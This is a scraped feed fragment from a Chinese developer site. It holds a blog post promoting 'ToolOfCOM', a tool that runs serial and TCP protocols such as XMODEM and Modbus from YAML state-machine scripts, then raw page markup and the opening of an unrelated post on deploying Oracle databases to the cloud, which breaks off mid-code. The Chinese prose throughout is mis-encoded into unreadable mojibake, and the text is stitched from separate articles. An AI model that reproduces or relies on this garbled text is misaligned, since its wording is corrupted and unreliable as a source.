#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨åµŒå…¥å¼å¼€å‘ã€è‡ªåŠ¨åŒ–æµ‹è¯•ã€å·¥æ§è”è°ƒçš„ä¸–ç•Œé‡Œï¼Œæœ‰ä¸€ä¸ªæ°¸æ’çš„ç—›ç‚¹ï¼š</p>
<p><strong>åŒä¸€å¥—é€šä¿¡é€»è¾‘ï¼Œä¼šåœ¨ä¸åŒçš„å·¥å…·é‡Œè¢«åå¤å®ç°ã€‚</strong></p>
<ul>
<li>MCU Bootloader å‡çº§è¦å†™ä¸€å¥—ä¸Šä½æœº</li>
<li>Modbus è°ƒè¯•åˆå†™ä¸€å¥—</li>
<li>TCP æ§åˆ¶å°å†æ¥ä¸€å¥—</li>
<li>æµ‹è¯•å¹³å°è„šæœ¬è¿˜è¦é‡å†™ä¸€é</li>
</ul>
<p>åè®®æ²¡æœ‰å˜ï¼Œåªæ˜¯æ‰§è¡Œæ–¹å¼æ¢äº†ï¼Œäººå´ä¸€ç›´åœ¨é‡å¤åŠ³åŠ¨ã€‚</p>
<p>æˆ‘æ›¾ç»ä»¥ä¸ºè¿™æ˜¯æ­£å¸¸çš„ï¼Œç›´åˆ°æˆ‘å†™å‡ºäº†è¿™ä¸ªé¡¹ç›®ï¼š</p>
<pre><code class="hljs">ToolOfCOM
</code></pre>
<blockquote>
<p>ä¸€ä¸ªèƒ½â€œè¯»æ‡‚ YAML å¹¶æ‰§è¡Œé€šä¿¡åè®®é€»è¾‘â€çš„è¿è¡Œæ—¶ç³»ç»Ÿã€‚ ä½ ä¸å†éœ€è¦å†™ä¸Šä½æœºï¼Œå†™ä¸€ä»½ YAML å°±å¤Ÿäº†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ğŸ§  ä¸ºä»€ä¹ˆä¼šæœ‰ ToolOfCOMï¼Ÿ</h2>
<p>æˆ‘ä»¬çœŸæ­£æƒ³è°ƒè¯•çš„ä¸æ˜¯â€œä¸²å£â€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>ç­‰å¾…æŸä¸ªäº‹ä»¶</li>
<li>åˆ¤æ–­å›åŒ…å†…å®¹</li>
<li>è¶…æ—¶å¤„ç†</li>
<li>æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</li>
<li>åè®®å‡çº§è¿ç»­è¡Œä¸º</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šä½æœºæ˜¯ä¸€å°<strong>é€šä¿¡çŠ¶æ€æœº</strong>ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬æŠŠçŠ¶æ€æœºç¡¬ç¼–ç åœ¨ Python / C# / LabVIEW é‡Œï¼Œæ‰€ä»¥ï¼š</p>
<blockquote>
<p>æ¯æ¢ä¸€ä¸ªåè®®ï¼Œä¹Ÿå°±æ¢äº†ä¸€å¥—ä¸Šä½æœºã€‚</p>
</blockquote>
<p>è¿™æ˜¯é‡å¤åŠ³åŠ¨çš„æ ¹æºã€‚</p>
<p>æˆ‘åœ¨ ToolOfCOM é‡Œåšäº†ä¸€ä»¶ç®€å•å´é¢ è¦†æ€§çš„äº‹ï¼š</p>
<h3 data-id="heading-1"><strong>æŠŠé€šä¿¡è¿‡ç¨‹æŠ½è±¡æˆ YAML DSL</strong></h3>
<p>åè®®åªæ˜¯ Driver é€šä¿¡åªæ˜¯ Channel æ‰§è¡Œè¿‡ç¨‹ç”±çŠ¶æ€æœºè§£é‡Š</p>
<p>äºæ˜¯é€šä¿¡é€»è¾‘ä»æ­¤å˜æˆäº†<strong>æ–‡æœ¬èµ„äº§</strong>ã€‚</p>
<h2 data-id="heading-2">ğŸš€ ç”¨ä¸€å¥è¯ç†è§£ ToolOfCOM</h2>
<blockquote>
<p><strong>å®ƒæ˜¯é€šä¿¡åè®®çš„è¿è¡Œæ—¶å¼•æ“ï¼Œ</strong> <strong>æŠŠä¸Šä½æœºå˜æˆå¯æ‰§è¡Œçš„ YAML çŠ¶æ€æœºã€‚</strong></p>
</blockquote>
<p>å’Œä¸²å£åŠ©æ‰‹ç­‰å·¥å…·çš„åŒºåˆ«åœ¨è¿™é‡Œï¼š</p>

















<table><thead><tr><th>å·¥å…·ç±»å‹</th><th>æ€ç»´æ¨¡å¼</th></tr></thead><tbody><tr><td>ä¼ ç»Ÿä¸Šä½æœº</td><td>â€œç‚¹æŒ‰é’® + å†™é€»è¾‘ + è°ƒä»£ç â€</td></tr><tr><td>ToolOfCOM</td><td>â€œå†™ YAML = å®šä¹‰åè®®æ‰§è¡Œé“¾â€</td></tr></tbody></table>
<p>ä¸æ˜¯æ›¿ä»£ï¼Œè€Œæ˜¯å‡ç»´ã€‚</p>
<h2 data-id="heading-3">ğŸ“ æ¶æ„é•¿è¿™æ ·ï¼ˆæç®€ä½†æœ‰æ€ä¼¤åŠ›ï¼‰</h2>
<pre><code class="hljs language-scss" lang="scss">YAML DSL
  â†“ parser
ScriptAST
  â†“ executor
Runtime Engine
  â”œâ”€ ActionRegistry
  â”œâ”€ Protocol Drivers (XMODEM / Modbus RTU/ASCII/TCP / YMODEM)
  â””â”€ Channels (UART / TCP / Logging)
</code></pre>
<p>ä¸€å¥è¯æ‹†è§£ï¼š</p>
<ul>
<li>YAML = é€šä¿¡æè¿°è¯­è¨€</li>
<li>Parser = æŠŠ YAML å˜æˆ AST</li>
<li>Runtime Engine = çŠ¶æ€æœºæ‰§è¡Œå™¨</li>
<li>Actions = å…·ä½“åŠ¨ä½œ</li>
<li>Drivers = åè®®æ ˆ</li>
<li>Channels = ä¸²å£/TCP æŠ½è±¡å±‚</li>
</ul>
<p><strong>åè®®ã€é€šé“ã€é€»è¾‘ä¸‰è€…å½»åº•è§£è€¦ã€‚</strong></p>
<h2 data-id="heading-4">ğŸ§¾ çœ‹çœ‹å®ƒçš„ YAMLï¼ˆæ¯” Python è¿˜é¡ºçœ¼ï¼‰</h2>
<p>è¿™æ˜¯ä¸€ä¸ªçœŸçš„å¯ä»¥æ‰§è¡Œçš„è„šæœ¬ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-number">1</span>
<span class="hljs-attr">vars:</span> { <span class="hljs-attr">block:</span> <span class="hljs-number">1</span>, <span class="hljs-attr">file_path:</span> <span class="hljs-string">./firmware.bin</span> }

<span class="hljs-attr">channels:</span>
  <span class="hljs-attr">boot:</span> { <span class="hljs-attr">type:</span> <span class="hljs-string">uart</span>, <span class="hljs-attr">device:</span> <span class="hljs-string">COM5</span>, <span class="hljs-attr">baudrate:</span> <span class="hljs-number">115200</span> }

<span class="hljs-attr">state_machine:</span>
  <span class="hljs-attr">initial:</span> <span class="hljs-string">wait_C</span>
  <span class="hljs-attr">states:</span>
    <span class="hljs-attr">wait_C:</span>
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">"C":</span> <span class="hljs-string">send_block</span> }
      <span class="hljs-attr">timeout:</span> <span class="hljs-number">5000</span>
      <span class="hljs-attr">on_timeout:</span> <span class="hljs-string">fail</span>

    <span class="hljs-attr">send_block:</span>
      <span class="hljs-attr">do:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">action:</span> <span class="hljs-string">send_xmodem_block</span>
          <span class="hljs-attr">args:</span> { <span class="hljs-attr">block:</span> <span class="hljs-string">"$block"</span> }
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">ACK:</span> <span class="hljs-string">next_block</span>, <span class="hljs-attr">NAK:</span> <span class="hljs-string">send_block</span> }
      <span class="hljs-attr">timeout:</span> <span class="hljs-number">2000</span>
      <span class="hljs-attr">on_timeout:</span> <span class="hljs-string">fail</span>

    <span class="hljs-attr">next_block:</span>
      <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">set:</span> { <span class="hljs-attr">block:</span> <span class="hljs-string">"$block + 1"</span> } ]
      <span class="hljs-attr">when:</span> <span class="hljs-string">"$block &lt;= file.block_count"</span>
      <span class="hljs-attr">goto:</span> <span class="hljs-string">send_block</span>
      <span class="hljs-attr">else_goto:</span> <span class="hljs-string">send_eot</span>

    <span class="hljs-attr">send_eot:</span>
      <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">action:</span> <span class="hljs-string">send_eot</span> ]
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">ACK:</span> <span class="hljs-string">done</span> }

    <span class="hljs-attr">done:</span> { <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">log:</span> <span class="hljs-string">"Completed"</span> ] }
</code></pre>
<p>è¿™ä¸æ˜¯é…ç½®æ–‡ä»¶ã€‚</p>
<p><strong>è¿™æ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„é€šä¿¡æµç¨‹ä»£ç ã€‚</strong></p>
<h2 data-id="heading-5">ğŸ” å®ƒæ˜¯æ€ä¹ˆè·‘èµ·æ¥çš„ï¼Ÿ</h2>
<p>å®Œæ•´é“¾è·¯å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">toolofcom run upgrade.yaml
â†’ è§£æ YAML â†’ æ„å»ºçŠ¶æ€æœº â†’ åˆ›å»º UART/TCP é€šé“
â†’ æ³¨å†ŒåŠ¨ä½œ/åè®®é©±åŠ¨
â†’ æ‰§è¡Œ <span class="hljs-keyword">do</span> æŒ‡ä»¤ â†’ ç›‘å¬äº‹ä»¶/è¶…æ—¶
â†’ çŠ¶æ€è·³è½¬ â†’ å‘é€/æ”¶åŒ… â†’ å¾ªç¯æ‰§è¡Œ
â†’ done
</code></pre>
<p>æ‰§è¡Œæ—¥å¿—ä¼šå‘ˆç°æ¯ä¸€æ¬¡çŠ¶æ€è·³è½¬ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">STATE</span>] wait_C
waiting <span class="hljs-keyword">for</span> handshake...
[<span class="hljs-meta">STATE</span>] send_block
[<span class="hljs-meta">STATE</span>] next_block
...
Completed
</code></pre>
<p>å¦‚æœå¯ç”¨ LoggingChannelï¼Œè¿˜èƒ½æŠŠæ‰€æœ‰ TX/RX å¸§å†™å…¥æ—¥å¿—æ–‡ä»¶â€”â€”éå¸¸é€‚åˆè‡ªåŠ¨åŒ–æµ‹è¯•ä¸åè®®éªŒè¯ã€‚</p>
<h2 data-id="heading-6">âš¡ ä¸ºä»€ä¹ˆè¿™ä»¶äº‹æ„ä¹‰é‡å¤§ï¼Ÿ</h2>
<p>å› ä¸ºå®ƒæ”¹å˜äº†é€šä¿¡é€»è¾‘çš„ç”Ÿäº§æ–¹å¼ï¼š</p>






























<table><thead><tr><th>è§†è§’</th><th>è¿‡å»</th><th>ToolOfCOM</th></tr></thead><tbody><tr><td>åè®®æ¼”è¿›æˆæœ¬</td><td>æ”¹ä»£ç </td><td>æ”¹ YAML</td></tr><tr><td>æµ‹è¯•äººå‘˜</td><td>å­¦è„šæœ¬</td><td>å­¦çŠ¶æ€æœº</td></tr><tr><td>å·¥ç¨‹åä½œ</td><td>å‘å·¥å…·</td><td>å‘è„šæœ¬</td></tr><tr><td>åè®®èµ„äº§åŒ–</td><td>ä¸å­˜åœ¨</td><td>âœ” å®ç°</td></tr></tbody></table>
<p>æ›´å…³é”®çš„æ˜¯ï¼š</p>
<h3 data-id="heading-7"><strong>åŒä¸€ä»½ YAML å¯ä»¥åœ¨ä¸²å£ã€TCP ç­‰ä¸åŒé€šé“è¿è¡Œ</strong></h3>
<p>åè®®é€»è¾‘ç¬¬ä¸€æ¬¡å®ç°è·¨ä»‹è´¨å¤ç”¨ã€‚</p>
<h2 data-id="heading-8">ğŸ”¥ ç°å®ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ToolOfCOM å·²ç»æ”¯æŒï¼š</p>





























<table><thead><tr><th>åŠŸèƒ½</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td>XMODEM å‡çº§é“¾è·¯</td><td>âœ” MCU Bootloader æµ‹è¯•ç¥å™¨</td></tr><tr><td>Modbus RTU/ASCII/TCP</td><td>âœ” å·¥æ§ç°åœºç›´æ¥ç”¨</td></tr><tr><td>ä¸²å£/TCP æ··åˆé€šé“</td><td>âœ” å¯åˆ‡æ¢è¿è¡Œ</td></tr><tr><td>çŠ¶æ€æœºé©±åŠ¨è‡ªåŠ¨åŒ–æµ‹è¯•</td><td>âœ” æ— éœ€å†™ä»£ç </td></tr><tr><td>åè®®åŠ¨ä½œæ‰©å±•</td><td>âœ” ç»§æ‰¿ BaseProtocol å³å¯å¢åŠ åè®®</td></tr></tbody></table>
<p>ä½ ç”šè‡³å¯ä»¥æŠŠæŸä¸ªåè®®çš„æ‰§è¡Œé€»è¾‘<strong>æäº¤åˆ°ä»“åº“é‡Œå¤ç”¨</strong>ã€‚</p>
<p>åè®®ç¬¬ä¸€æ¬¡å˜æˆå¯ä»¥å…±äº«çš„èµ„äº§ã€‚</p>
<h2 data-id="heading-9">ğŸ§­ å®ƒçš„æœªæ¥ï¼ˆè¿™æ˜¯æ•´ä¸ªæ•…äº‹çš„å‡ç»´ç‚¹ï¼‰</h2>
<p>ToolOfCOM æ­£åœ¨æ‰“å¼€ä¸€ä¸ªå¯èƒ½æ€§ï¼š</p>
<pre><code class="hljs">åè®®ä¸å†æ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œ
åè®®æœ¬èº«å°±æ˜¯ä¸€æ®µå¯ä»¥æ‰§è¡Œçš„è„šæœ¬ã€‚
</code></pre>
<p>ä»æ­¤ä»¥åï¼š</p>
<ul>
<li>äº§å“å‡çº§æ˜¯ YAML</li>
<li>è®¾å¤‡è°ƒè¯•æ˜¯ YAML</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•æ˜¯ YAML</li>
<li>å·¥ç¨‹äº¤ä»˜ä¹Ÿæ˜¯ YAML</li>
</ul>
<p>å†ä¹Ÿä¸ä¼šæœ‰äººé—®ï¼š</p>
<blockquote>
<p>â€œæœ‰æ²¡æœ‰è¿™ä¸ªåè®®çš„ä¸Šä½æœºï¼Ÿâ€</p>
</blockquote>
<p>å› ä¸ºå›ç­”å°†å˜æˆï¼š</p>
<pre><code class="hljs">ç»™æˆ‘ YAMLï¼Œæˆ‘æ¥è·‘ã€‚
</code></pre>
<h2 data-id="heading-10">ğŸ å†™åœ¨æœ€å</h2>
<p>æˆ‘åšè¿™ä¸ªé¡¹ç›®ï¼Œä¸æ˜¯ä¸ºäº†åšä¸€ä¸ªæ›´å¥½çœ‹çš„ä¸²å£åŠ©æ‰‹ã€‚</p>
<p>è€Œæ˜¯ä¸ºäº†ç»™å·¥ç¨‹å¸ˆä¸€ä¸ª<strong>æ–°çš„è§†è§’</strong>ï¼š</p>
<blockquote>
<p><strong>é€šä¿¡ä¸æ˜¯å‘½ä»¤ï¼Œé€šä¿¡æ˜¯æµç¨‹ã€‚</strong> <strong>æµç¨‹ä¸è¯¥å†™æ­»åœ¨ä»£ç é‡Œï¼Œå®ƒåº”è¯¥è¢«æè¿°ã€å¤ç”¨ã€æ‰§è¡Œã€‚</strong></p>
</blockquote>
<p>ToolOfCOM è®©è¿™ä»¶äº‹çœŸæ­£å‘ç”Ÿäº†ã€‚</p>
<h2 data-id="heading-11">ğŸ“ é¡¹ç›®å¼€æºåœ°å€</h2>
<p>ğŸ‘‰ <strong>è¯„è®ºåŒºå¯è§</strong></p>
<h2 data-id="heading-12">ğŸŒŸ å¦‚æœè¿™ç¯‡æ–‡ç« æ”¹å˜äº†ä½ å¯¹â€œé€šä¿¡é€»è¾‘â€çš„ç†è§£ï¼Œ</h2>
<p>è¯·ç‚¹ä¸ªèµã€å…³æ³¨æˆ‘ï¼Œä¸‹ä¸€ç¯‡æˆ‘ä¼šç»§ç»­æ­å¼€ï¼š</p>
<p><strong>åè®®å³èµ„äº§ï¼Œæœªæ¥çš„å·¥ç¨‹åä½œä¼šæ˜¯ä»€ä¹ˆæ ·ï¼Ÿ</strong></p>
<p><strong>å…¨æ–‡å®Œ</strong> ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ]]></title>    <link>https://juejin.cn/post/7580809247736725544</link>    <guid>https://juejin.cn/post/7580809247736725544</guid>    <pubDate>2025-12-08T04:56:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736725544" data-draft-id="7580809247736709160" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ"/> <meta itemprop="keywords" content="æ•°æ®åº“,Oracle,MySQL"/> <meta itemprop="datePublished" content="2025-12-08T04:56:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¶æ—¥å¤±çœ è€…"/> <meta itemprop="url" content="https://juejin.cn/user/3411111810444068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411111810444068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¶æ—¥å¤±çœ è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:56:04.000Z" title="Mon Dec 08 2025 04:56:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.1 äº‘ç¯å¢ƒéƒ¨ç½²æ¦‚è¿°</h2>
<h3 data-id="heading-1">1.1.1 äº‘éƒ¨ç½²ä¼˜åŠ¿</h3>
<p>å°†Oracleæ•°æ®åº“éƒ¨ç½²åˆ°äº‘ç¯å¢ƒå…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>å¼¹æ€§æ‰©å±•</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚åŠ¨æ€è°ƒæ•´èµ„æºé…ç½®</li>
<li><strong>æˆæœ¬ä¼˜åŒ–</strong>ï¼šæŒ‰éœ€ä»˜è´¹ï¼Œé™ä½åŸºç¡€è®¾æ–½æŠ•å…¥</li>
<li><strong>é«˜å¯ç”¨æ€§</strong>ï¼šäº‘æœåŠ¡å•†æä¾›çš„SLAä¿éšœ</li>
<li><strong>ç®€åŒ–è¿ç»´</strong>ï¼šè‡ªåŠ¨åŒ–å¤‡ä»½ã€ç›‘æ§å’Œç»´æŠ¤</li>
<li><strong>å…¨çƒéƒ¨ç½²</strong>ï¼šå¿«é€Ÿåœ¨å…¨çƒèŒƒå›´å†…éƒ¨ç½²æ•°æ®åº“å®ä¾‹</li>
</ul>
<h3 data-id="heading-2">1.1.2 éƒ¨ç½²é€‰é¡¹</h3>
<ul>
<li><strong>Oracle Cloud Infrastructure (OCI)</strong>ï¼šåŸç”Ÿäº‘è§£å†³æ–¹æ¡ˆ</li>
<li><strong>AWS RDS for Oracle</strong>ï¼šæ‰˜ç®¡æ•°æ®åº“æœåŠ¡</li>
<li><strong>Azure Database for Oracle</strong>ï¼šå¾®è½¯äº‘æ‰˜ç®¡æœåŠ¡</li>
<li><strong>é˜¿é‡Œäº‘RDS for Oracle</strong>ï¼šå›½å†…äº‘æœåŠ¡å•†è§£å†³æ–¹æ¡ˆ</li>
</ul>
<h2 data-id="heading-3">1.2 OCIäº‘ç¯å¢ƒéƒ¨ç½²</h2>
<h3 data-id="heading-4">1.2.1 åˆ›å»ºæ•°æ®åº“å®ä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨OCI CLIåˆ›å»ºè‡ªæ²»æ•°æ®åº“</span>
oci db autonomous-database create \
  --compartment-id ocid1.compartment.oc1..example \
  --db-name <span class="hljs-string">"MyFinanceDB"</span> \
  --cpu-core-count 2 \
  --data-storage-size-in-tbs 1 \
  --admin-password <span class="hljs-string">"StrongPassword123!"</span> \
  --license-model LICENSE_INCLUDED \
  --display-name <span class="hljs-string">"Finance Production Database"</span>

<span class="hljs-comment"># ä½¿ç”¨Terraformåˆ›å»ºåŸºç¡€è®¾æ–½</span>
resource <span class="hljs-string">"oci_database_autonomous_database"</span> <span class="hljs-string">"finance_adb"</span> {
  compartment_id = var.compartment_ocid
  db_name        = <span class="hljs-string">"MyFinanceDB"</span>
  cpu_core_count = 2
  data_storage_size_in_tbs = 1
